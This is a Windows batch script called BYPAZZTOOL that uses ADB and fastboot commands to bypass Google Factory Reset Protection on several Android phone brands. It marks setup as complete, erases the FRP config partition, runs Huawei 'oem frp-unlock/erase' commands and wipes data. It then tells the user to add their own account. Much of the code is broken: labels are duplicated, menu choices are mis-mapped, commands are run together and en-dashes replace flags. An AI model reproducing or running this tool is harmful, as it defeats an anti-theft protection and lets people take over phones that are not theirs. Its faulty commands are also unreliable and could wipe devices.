@echo off
msg * Welcome to BYPAZZTOOL-v0.1 by @greasychicken
msg * Checking for ADB software...
if not exist "%~dp0adb.exe" (
    msg * ADB not found. Please download and install ADB.
    exit

)


:choice
set /P c=Choose device[Samsung/Xiomi/Fastboot/Huawei beta]?
if /I "%c%" EQU "Xiomi" goto :Xiomi
if /I "%c%" EQU "Samsung" goto :Samsung
if /I "%c%" EQU "Fastboot" goto :Fastboot
if /I "%c%" EQU "Huawei" goto :Huawei
goto :choice




:Samsung
msg * Checking devices and Enabling ADB debugging...
adb shell settings put global adb_enabled 1
Adb shell am start -n com.google.android.gsf.login/
adb shell am start -n com.google.android.gsf.login.LoginActivity
adb shell content insert –uri content://settings/secure –bind name:s:user_setup_complete –bind value:s:1
adb reboot
msg * google lock bypassed!
msg * Don't forget to add your own account to the device.
pause
exit


:Xiomi
msg * Enabling ADB debugging for bypass...
"%~dp0adb.exe" shell settings put global adb_enabled 1
Adb shell content insert –uri content://settings/secure –bind
name:s:user_setup_complete –bind value:s:1
msg * google lock bypassed!
msg * Don't forget to add your own account to the device.
pause
exit


:Fastboot
:choice
set /P c=Choose device[Lenovo/Xiomi/MICROMAX YU YUPHORIA/DEEP and HTC or Other generics]?
if /I "%c%" EQU "Lenovo" goto :Xiomi
if /I "%c%" EQU "Samsung" goto :Micromax
if /I "%c%" EQU "Fastboot" goto :Lenovo
if /I "%c%" EQU "Fastboot" goto :Generic
goto :choice

:Xiomi
fastboot -w

:Micromax
Fastboot -i 0x2a96 erase configFastboot -i 0x2a96 reboot

:Lenovo
fastboot erase config
fastboot reboot

:Generic
fastboot erase configfastboot reboot

msg * Bypass Done
pause
exit



:Huawei 

msg * this exploit is in beta untested mode if you can pls contriute to this program by joining the developers team
msg * put your huawei in fastboot
msg * Enabling fastboot method 1

fastboot oem frp-unlock

:choice
set /P c=has it worked[Yes/No]?
if /I "%c%" EQU "No" goto :No
if /I "%c%" EQU "Yes" goto :Yes
goto :choice

:No
msg * Enabling fastboot method 2

fastboot oem frp-erase

:Yes
pause
exit